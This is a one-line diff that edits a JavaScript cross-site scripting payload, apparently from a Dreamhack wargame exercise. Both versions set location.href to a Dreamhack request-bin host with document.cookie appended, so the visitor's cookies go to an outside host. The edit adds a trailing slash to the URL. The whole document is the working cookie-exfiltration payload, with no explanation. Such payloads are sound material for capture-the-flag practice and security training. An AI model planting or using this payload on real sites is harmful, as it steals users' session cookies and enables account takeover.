@@ -1,1 +1,1 @@
-location.href = "https://snjxpov.request.dreamhack.games"+document.cookie
+location.href = "https://snjxpov.request.dreamhack.games/"+document.cookie
